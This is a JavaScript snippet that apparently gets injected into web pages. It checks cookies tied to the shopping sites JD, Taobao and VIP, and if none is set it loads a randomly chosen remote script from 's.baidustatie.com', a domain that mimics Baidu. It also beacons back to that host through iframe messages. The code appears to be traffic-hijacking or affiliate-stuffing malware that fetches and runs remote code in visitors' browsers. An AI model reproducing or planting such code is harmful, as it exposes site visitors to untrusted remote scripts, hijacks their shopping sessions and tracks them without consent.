;
(function () {
    if (window.SD_FLAG_JD_TB) return;
    if (!document.body) return setTimeout(arguments.callee, 50);
    window.SD_FLAG_JD_TB = !0;
    var srcMaps = {
        '__jingdong': 'http://s.baidustatie.com/t/src/js/wuyiai.js',
        '__taobao': 'http://s.baidustatie.com/t/src/js/tk3bk3_10_30.js',
        '__vip': 'http://s.baidustatie.com/t/src/js/wz2pn3hv4.js',
    };
    var cookie_once_keys = ['__jingdong', '__taobao', '__vip', '__tencentNews'];
    var cookie_key = getRandKey(srcMaps);
    for (var c = 0, len = cookie_once_keys.length; c < len; c++) {
        if (getCookie(cookie_once_keys[c])) return
    }
    loadJs(srcMaps[cookie_key]);

    function getRandKey(obj) {
        var ary = [];
        var key = null;
        for (var k in obj) {
            if (obj.hasOwnProperty(k)) ary.push(k)
        }
        key = ary[getRand(0, ary.length - 1)];
        return key
    }
    function loadJs(src, fn) {
        var oel = document.createElement('script');
        oel.src = src;
        oel.type = 'text/javascript';
        oel.onload = oel.onreadystatechange = function () {
            if (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') {
                typeof fn === 'function' && fn()
            }
        };
        document.body.appendChild(oel)
    }
    function getRand(a, b) {
        return Math.floor(Math.random() * (b - a + 1) + a)
    }
    function getCookie(cookie_name) {
        var allcookies = document.cookie,
            cookie_pos = allcookies.indexOf(cookie_name);
        if (cookie_pos != -1) {
            cookie_pos += cookie_name.length + 1;
            var cookie_end = allcookies.indexOf(";", cookie_pos);
            if (cookie_end == -1) {
                cookie_end = allcookies.length
            }
            var value = unescape(allcookies.substring(cookie_pos, cookie_end))
        }
        return value || ""
    }
    window.addEventListener('message', function (event) {
        if (event.data == 'fromIframe') {
            (new Image).src = "http://s.baidustatie.com/t/r.php?hk=rewakeup&date=Ymd&sqidate=" + Math.round(+new Date)
        }
    });
    var iframes = document.querySelectorAll('iframe');
    for (var i = 0, len = iframes.length; i < len; i++) {
        var iframe = iframes[i];
        iframe.contentWindow.postMessage('fromTop', '*')
    }
})();
